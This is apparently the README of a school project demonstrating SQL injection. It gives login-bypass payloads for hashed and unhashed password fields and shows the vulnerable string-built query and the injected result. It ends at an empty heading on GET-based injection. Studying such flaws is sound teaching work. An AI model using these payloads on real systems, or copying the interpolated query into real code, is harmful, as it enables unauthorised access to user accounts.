# elsys_shop
Small school project. Nothing complicated just simple display of SQL Queries and how to exploit them.

# Basic login bypass
## Hashed input

Username: 
```
1' or '1'='1' --  
```
(note the all the spaces are necessary, even after the comment !)

This works when the password input is hashed, be it MD5 or Sha1.
The password input can be empty, it doesn't matter as we force it to be skipped.
Normal query looks like this:

```
SELECT * FROM users WHERE username='$username' AND password='$password'
```

After the SQL injection the query looks like this:
```
SELECT * FROM users WHERE username='1' or '1'='1' -- ' AND password='da39a3ee5e6b4b0d3255bfef95601890afd80709'
```

## Unhashed input

Username:
```
1' or '1'='1
```
Password:
```
1' or '1'='1
```

Standard query looks just like the previous one.
Malicious query looks like this:
```
SELECT * FROM users WHERE username='1' or '1'='1' AND password='1' OR '1'='1'
```

# String Based SQLi - GET
